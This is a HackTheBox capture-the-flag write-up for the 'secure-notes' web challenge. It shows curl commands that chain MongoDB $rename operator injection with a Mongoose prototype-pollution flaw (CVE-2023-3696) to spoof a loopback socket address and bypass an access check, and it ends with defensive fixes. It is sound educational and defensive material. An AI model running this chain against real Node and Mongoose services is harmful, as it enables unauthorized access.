---
title: web/secure-notes
platform: HTB
event: challenge
category: web
tags: [prototype-pollution, nosql-injection, mongoose, cve-2023-3696, nodejs, access-control-bypass]
status: solved
difficulty: 2
---

# web/secure-notes

**Flag:** `HTB{m0ng00s3_REDACTED}`

**Difficulty:** 🌶️🌶️ (2/5)

**Solve script:** `artifacts/solve.py`, run as `python3 solve.py <target_ip> <target_port>`.

## Summary

Secure Notes is a small note-taking app: Express 4.18.2, Mongoose 7.2.4, and MongoDB 7 in one container under supervisord. Notes are created, read, and updated through `/create`, `/get/:noteId`, and `/update`. A `/flag` route returns the flag only when `req.connection.remoteAddress` is a loopback address.

`/update` passes the whole request body into `Note.findByIdAndUpdate(noteId, req.body)`, so the body can carry MongoDB update operators. Mongoose 7.2.4 hydrates a stored document that has a top-level `__proto__` field by recursing into `Object.prototype` (CVE-2023-3696, fixed in 7.3.3). A `$rename` that moves `content` under `__proto__._peername.address` therefore poisons `Object.prototype._peername` on the next document read. Node's `Socket.prototype.remoteAddress` getter returns `this._getpeername().address`, and `_getpeername` returns `this._peername` when it is set, including through the prototype chain. Every later request then looks like it comes from `127.0.0.1`, and `/flag` returns the flag.

## Attack chain

1. **Recon.** The source shows the loopback-only `/flag` route and the unfiltered `findByIdAndUpdate(noteId, req.body)` call. `package-lock.json` pins `mongoose` 7.2.4.
2. **Operator injection.** `req.body` is used as the update document, so `$rename` can be supplied. The source path must exist in the schema, and `content` qualifies.
3. **Dangerous field name.** `$rename: { content: "__proto__._peername.address" }` makes MongoDB store the note as `{ __proto__: { _peername: { address: "127.0.0.1" } } }`.
4. **Hydration.** `/update` re-reads the note with `Note.find`. Mongoose's `Document._init` walks the stored keys. For the key `__proto__`, `doc['__proto__']` evaluates to `Object.prototype`, so the recursion writes `_peername.address` onto `Object.prototype` instead of onto the document.
5. **Node gadget.** `net.Socket.prototype.remoteAddress` is `this._getpeername().address`, and `_getpeername` returns `this._peername` when truthy. New sockets inherit the polluted `_peername`, so `remoteAddress` reports `127.0.0.1`.
6. **Flag.** Request `/flag` on a fresh connection; the loopback check passes.

### Code analysis

The whole app is one file, `challenge/src/app.js`, plus the Mongo and Node setup in the Dockerfile and `conf/supervisord.conf` (`command=node app.js`, `mongod` in the same container). `package-lock.json` pins `express` 4.18.2 and `mongoose` 7.2.4.

The loopback check on `/flag` (line 30):

```js
app.get('/flag', (req, res) => {
    const remoteAddress = req.connection.remoteAddress;
    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
```

The check trusts the socket address, not an HTTP header, so a request that reaches the server from outside can only pass by changing what `remoteAddress` returns. That value comes from Node's `net.Socket` getter, not from the request.

The vulnerable write (line 67-71):

```js
app.post('/update', async (req, res) => {
    try {
        const { noteId } = req.body;
        await Note.findByIdAndUpdate(noteId, req.body);
        let result = await Note.find({ _id: noteId });
```

`req.body` goes straight into the update. It is not whitelisted, so the caller can send MongoDB update operators such as `$rename`. The `Note` schema defines `title` and `content`; the solver's `$rename` moves `content` into a `__proto__` path. Whether the schema filters that path is what the lab run settled: it was accepted and stored.

The second `Note.find` runs on the same document right after the update. That read is where Mongoose 7.2.4 hydrates the stored `__proto__` field (CVE-2023-3696, fixed in 7.3.3).

`/create` checks that `title` and `content` are strings. `/get/:noteId` does no validation and returns the stored document as-is. Neither route inspects the stored shape, so `/update` alone is enough to plant the field.

## Steps

1. **Create a note whose content is the fake peer address.**

   ```
   $ curl -s -X POST http://<target>/create \
       -H 'Content-Type: application/json' \
       -d '{"title":"x","content":"127.0.0.1"}'
   {"title":"x","content":"127.0.0.1","_id":"...","__v":0}
   ```

2. **Rename the field under `__proto__`.**

   ```
   $ curl -s -X POST http://<target>/update \
       -H 'Content-Type: application/json' \
       -d '{"noteId":"<id>","$rename":{"content":"__proto__._peername.address"}}'
   [{"_id":"<id>","title":"x","__v":0}]
   ```

   The response is the re-read document. That read is the step that hydrates the stored `__proto__` field and poisons the prototype.

3. **Request the flag from a new connection.**

   ```
   $ curl -s http://<target>/flag
   HTB{...}
   ```

   The solver does all three steps and also resets the prototype slot first, so it works on a fresh instance and on one that was left in a bad state.

## Sample output

Output of the documented solve command against the live instance, with the flag masked.

```
$ python3 solve.py 154.57.164.74 39931
HTB{m0ng00s3_REDACTED}
```

## Problems hit

- Naming the target `__proto__._peername` (without `.address`) pollutes the slot with the note's string content. After that, the nested variant fails with `TypeError: Cannot create property 'address' on string '127.0.0.1'`, because Mongoose recurses into the existing truthy string.
- The fix is to reset the slot to a falsy value first: create a note with empty content and rename `content` to `__proto__._peername`. An empty string is still accepted by `/create`, and the hydration sets `Object.prototype._peername = ""`, after which the nested write works.
- The `$rename` source must be a schema path. Renaming arbitrary fields such as `address` is dropped by Mongoose strict mode, so the value has to come from `content`.
- `/update` returns the pre-update or re-read document, not a success marker. A 500 there means the hydration threw, which is the signal that the prototype slot is in the wrong shape.

## Defense

- Upgrade Mongoose to 7.3.3 or later (current 8.x/9.x lines), which fixes CVE-2023-3696.
- Never pass `req.body` to a model method. Whitelist the fields and operators the endpoint accepts.
- Strip `__proto__`, `constructor`, and `prototype` from both incoming updates and stored documents before hydration.
- Do not rely on socket internals for authorization. Put the privileged endpoint behind a separate listener or network interface, or authenticate it, instead of trusting `remoteAddress`.
- If you do check a proxy header, configure `trust proxy` explicitly and understand which hop it trusts.

## Lessons

- The dangerous gadget does not have to be in the application. Here it is a getter inside Node's `net` module, reachable through ordinary prototype pollution.
- A stored document field named `__proto__` is enough to pollute when an ORM hydrates it. Operator injection such as `$rename` can create exactly that field name.
- When a write fails halfway through a pollution chain, the polluted state can be fixed with another write. Treat prototype state as mutable and plan for recovery.
